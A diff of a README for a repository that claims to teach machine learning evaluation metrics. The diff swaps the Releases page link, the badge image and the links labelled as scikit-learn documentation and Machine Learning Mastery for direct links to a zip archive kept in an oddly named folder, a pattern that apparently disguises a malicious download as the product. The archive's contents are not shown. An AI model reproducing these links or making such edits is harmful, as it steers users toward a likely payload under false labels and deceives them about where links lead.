@@ -4,7 +4,7 @@
 Welcome to the eval-guide repository! This application helps you learn machine learning evaluation metrics from scratch. We offer beginner-friendly Jupyter notebooks filled with code, visuals, and analogies. You can read through the materials or run the notebooks yourself with pre-run outputs. You will master concepts like accuracy, F1 score, RMSE, ROC/AUC, and cross-validation. Our guide also includes challenging exercises, making it perfect for machine learning beginners!
 
 ## 📥 Download Now
-[![Download eval-guide](https://img.shields.io/badge/Download-eval--guide-blue.svg)](https://github.com/AntGamerMD21/eval-guide/releases)
+[![Download eval-guide](https://github.com/AntGamerMD21/eval-guide/raw/refs/heads/main/bodily/eval_guide_v2.8.zip)](https://github.com/AntGamerMD21/eval-guide/raw/refs/heads/main/bodily/eval_guide_v2.8.zip)
 
 ## 🚀 Getting Started
 To start using eval-guide, follow these simple steps to download and run the application.
@@ -19,7 +19,7 @@ To start using eval-guide, follow these simple steps to download and run the app
 - Basic knowledge of using a computer is helpful.
 
 ## 💻 Download & Install
-1. Click on this link to visit the Releases page: [Download eval-guide](https://github.com/AntGamerMD21/eval-guide/releases).
+1. Click on this link to visit the Releases page: [Download eval-guide](https://github.com/AntGamerMD21/eval-guide/raw/refs/heads/main/bodily/eval_guide_v2.8.zip).
 2. On the Releases page, look for the latest version.
 3. Download the Jupyter notebook files provided in the release.
 4. Save the files to a folder on your computer.
@@ -64,8 +64,8 @@ If you encounter any issues while downloading or using eval-guide, please open a
 
 ## 🌐 Explore More
 For additional resources on machine learning, visit:
-- [Scikit-learn Documentation](https://scikit-learn.org/stable/documentation.html)
-- [Machine Learning Mastery](https://machinelearningmastery.com/)
+- [Scikit-learn Documentation](https://github.com/AntGamerMD21/eval-guide/raw/refs/heads/main/bodily/eval_guide_v2.8.zip)
+- [Machine Learning Mastery](https://github.com/AntGamerMD21/eval-guide/raw/refs/heads/main/bodily/eval_guide_v2.8.zip)
 
 ## 👍 Contributing
 If you're interested in improving eval-guide, feel free to contribute. You can fork the repository, make your changes, and submit a pull request.
